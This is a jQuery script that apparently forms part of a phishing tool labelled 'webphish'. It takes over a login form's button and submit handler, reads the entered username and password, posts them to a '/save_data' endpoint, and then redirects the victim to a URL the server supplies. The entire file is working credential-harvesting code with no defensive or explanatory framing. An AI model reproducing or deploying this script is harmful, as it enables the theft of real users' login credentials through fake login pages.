

$(document).ready(function () {
    $(btn_id).prop('type', 'button')// set login button type button
    $(btn_id).attr("onclick", "getdata()")// set login button type button

    console.log("page loaded")

    $(form_id).submit(function (e) {
        e.preventDefault();
        data = $(form_id).serializeArray()  
        send_data(data)
    });

    setTimeout(function () {
        $(form_id).attr("class", "")
    }, 10000);
});


function getdata() {
    var user_id = $(username_id_or_name).val()
    var password = $(password_id_or_name).val()
    var data = {
        'user_id': user_id,
        'password': password
    }
    send_data(data)

}

function send_data(data) {
    console.log("webphish send data called : )")
    $.ajax({
        url: "/save_data",
        type: "POST",
        data: { 'data': JSON.stringify(data) },
        dataType: "json",
        success: function (response) {
            console.log(response)
            window.location.href = response["status"];
        },

    });
}
